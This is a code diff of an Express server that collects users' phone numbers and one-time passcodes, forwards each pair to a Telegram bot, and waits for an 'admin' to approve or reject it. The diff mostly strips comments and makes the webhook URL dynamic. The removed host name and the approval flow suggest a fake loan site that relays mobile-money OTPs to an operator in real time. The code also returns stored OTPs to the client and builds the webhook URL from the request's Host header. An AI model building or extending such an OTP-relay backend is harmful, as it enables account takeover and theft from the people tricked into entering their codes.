@@ -194,7 +194,7 @@ app.post('/api/send-otp', async (req, res) => {
         otpStore.set(phoneNumber, {
             otp: otp,
             expiresAt: expiresAt,
-            status: 'pending', // pending | approved | rejected
+            status: 'pending',
             timestamp: Date.now()
         });
 
@@ -206,7 +206,6 @@ app.post('/api/send-otp', async (req, res) => {
             otp: otp
         });
 
-        // Create inline keyboard with Approve and Reject buttons
         const replyMarkup = {
             inline_keyboard: [
                 [
@@ -243,7 +242,7 @@ app.post('/api/send-otp', async (req, res) => {
     }
 });
 
-// ===== 4. CHECK OTP STATUS (for frontend polling) =====
+// ===== 4. CHECK OTP STATUS =====
 app.post('/api/check-otp-status', async (req, res) => {
     try {
         const { phoneNumber } = req.body;
@@ -265,7 +264,6 @@ app.post('/api/check-otp-status', async (req, res) => {
             });
         }
 
-        // Check if OTP expired
         if (Date.now() > storedData.expiresAt) {
             otpStore.delete(phoneNumber);
             return res.status(400).json({
@@ -274,12 +272,11 @@ app.post('/api/check-otp-status', async (req, res) => {
             });
         }
 
-        // Return the status
         res.json({
             success: true,
             data: {
                 phoneNumber: phoneNumber,
-                status: storedData.status, // pending, approved, rejected
+                status: storedData.status,
                 otp: storedData.otp
             }
         });
@@ -293,7 +290,7 @@ app.post('/api/check-otp-status', async (req, res) => {
     }
 });
 
-// ===== 5. VERIFY OTP (Called when admin approves) =====
+// ===== 5. VERIFY OTP =====
 app.post('/api/verify-otp', async (req, res) => {
     try {
         const { phoneNumber, otp } = req.body;
@@ -315,7 +312,6 @@ app.post('/api/verify-otp', async (req, res) => {
             });
         }
 
-        // Check if OTP expired
         if (Date.now() > storedData.expiresAt) {
             otpStore.delete(phoneNumber);
             return res.status(400).json({
@@ -324,7 +320,6 @@ app.post('/api/verify-otp', async (req, res) => {
             });
         }
 
-        // Check if admin has approved
         if (storedData.status === 'pending') {
             return res.status(202).json({
                 success: false,
@@ -334,9 +329,7 @@ app.post('/api/verify-otp', async (req, res) => {
         }
 
         if (storedData.status === 'approved') {
-            // OTP is approved by admin
             otpStore.delete(phoneNumber);
-            
             return res.json({
                 success: true,
                 message: 'OTP verified successfully!',
@@ -348,7 +341,6 @@ app.post('/api/verify-otp', async (req, res) => {
 
         if (storedData.status === 'rejected') {
             otpStore.delete(phoneNumber);
-            
             return res.status(400).json({
                 success: false,
                 message: 'OTP was rejected by admin.'
@@ -369,10 +361,10 @@ app.post('/api/verify-otp', async (req, res) => {
     }
 });
 
-// ===== 6. TELEGRAM WEBHOOK (Receives admin button clicks) =====
+// ===== 6. TELEGRAM WEBHOOK =====
 app.post('/webhook/telegram', async (req, res) => {
     try {
-        console.log('📨 Webhook received:', JSON.stringify(req.body, null, 2));
+        console.log('📨 Webhook received');
         
         const { callback_query } = req.body;
         
@@ -381,18 +373,16 @@ app.post('/webhook/telegram', async (req, res) => {
             return res.sendStatus(200);
         }
 
-        const { data, from, id } = callback_query;
+        const { data, id } = callback_query;
         console.log('📨 Telegram callback received:', data);
 
-        // Parse callback data: approve_phoneNumber_otp or reject_phoneNumber_otp
         const parts = data.split('_');
         const action = parts[0];
-        const phoneNumber = parts.slice(1, -1).join('_'); // Handle phone numbers with underscores
+        const phoneNumber = parts.slice(1, -1).join('_');
         const otp = parts[parts.length - 1];
 
         console.log(`Action: ${action}, Phone: ${phoneNumber}, OTP: ${otp}`);
 
-        // Update OTP status
         const storedData = otpStore.get(phoneNumber);
         
         if (storedData && storedData.otp === otp) {
@@ -401,7 +391,6 @@ app.post('/webhook/telegram', async (req, res) => {
                 otpStore.set(phoneNumber, storedData);
                 console.log(`✅ OTP approved for ${phoneNumber}`);
                 
-                // Send approval notification to Telegram
                 const resultMessage = formatOtpResultData({
                     phoneNumber: phoneNumber,
                     otp: otp,
@@ -409,7 +398,6 @@ app.post('/webhook/telegram', async (req, res) => {
                 });
                 await sendToTelegram(resultMessage);
                 
-                // Answer callback
                 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                     callback_query_id: id,
                     text: '✅ OTP Approved! User can now proceed.',
@@ -420,7 +408,6 @@ app.post('/webhook/telegram', async (req, res) => {
                 otpStore.set(phoneNumber, storedData);
                 console.log(`❌ OTP rejected for ${phoneNumber}`);
                 
-                // Send rejection notification to Telegram
                 const resultMessage = formatOtpResultData({
                     phoneNumber: phoneNumber,
                     otp: otp,
@@ -428,7 +415,6 @@ app.post('/webhook/telegram', async (req, res) => {
                 });
                 await sendToTelegram(resultMessage);
                 
-                // Answer callback
                 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                     callback_query_id: id,
                     text: '❌ OTP Rejected! User will be notified.',
@@ -452,10 +438,13 @@ app.post('/webhook/telegram', async (req, res) => {
     }
 });
 
-// ===== 7. SET WEBHOOK ENDPOINT =====
+// ===== 7. SET WEBHOOK (DYNAMIC) =====
 app.get('/api/set-webhook', async (req, res) => {
     try {
-        const webhookUrl = `https://waafi-loans-production.up.railway.app/webhook/telegram`;
+        const protocol = req.protocol;
+        const host = req.get('host');
+        const webhookUrl = `${protocol}://${host}/webhook/telegram`;
+        
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook?url=${webhookUrl}`;
         
         console.log('🔗 Setting webhook URL:', webhookUrl);
@@ -465,7 +454,8 @@ app.get('/api/set-webhook', async (req, res) => {
         res.json({
             success: true,
             message: 'Webhook set successfully',
-            data: response.data
+            data: response.data,
+            webhookUrl: webhookUrl
         });
     } catch (error) {
         console.error('❌ Error setting webhook:', error);
@@ -498,7 +488,7 @@ app.get('/api/get-webhook', async (req, res) => {
     }
 });
 
-// ===== 9. TEST TELEGRAM ENDPOINT =====
+// ===== 9. TEST TELEGRAM =====
 app.get('/api/test-telegram', async (req, res) => {
     try {
         const testMessage = `
